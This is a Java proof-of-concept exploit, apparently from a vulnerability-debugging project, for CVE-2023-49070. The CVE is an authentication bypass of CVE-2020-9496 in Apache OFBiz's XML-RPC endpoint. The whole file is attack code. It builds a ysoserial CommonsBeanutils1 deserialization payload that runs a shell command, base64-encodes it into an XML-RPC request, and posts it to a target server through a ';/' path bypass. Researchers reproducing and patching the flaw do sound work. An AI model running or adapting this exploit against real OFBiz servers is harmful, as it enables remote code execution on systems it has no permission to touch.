package ofbiz.cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import com.pacemrc.vuldebug.common.utils.basic.ObjectUtil;
import com.pacemrc.vuldebug.common.utils.http.Response;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

/**
 * 为CVE-2020-9496漏洞的绕过
 */
public class CVE_2023_49070 {

    public static void main(String[] args) throws Exception {


        String url = "http://10.58.120.200:8080/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=s&requirePasswordChange=Y";

        String gadget = "CommonsBeanutils1";
        String cmd = "touch /tmp/success";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        String base64Str = ObjectUtil.ObjectToBase64Str(obj);
        System.out.println(base64Str);

        String xmlTemplate = "<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">BASE64</serializable></value></member></struct></value></param></params></methodCall>";
        String body = xmlTemplate.replaceAll("BASE64", base64Str);
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/xml");
        Response response = httpRequest.sendStringPost(httpPost, body);
        System.out.println(response.getStatusCode());
        System.out.println(response.getResponseBody());
    }
}
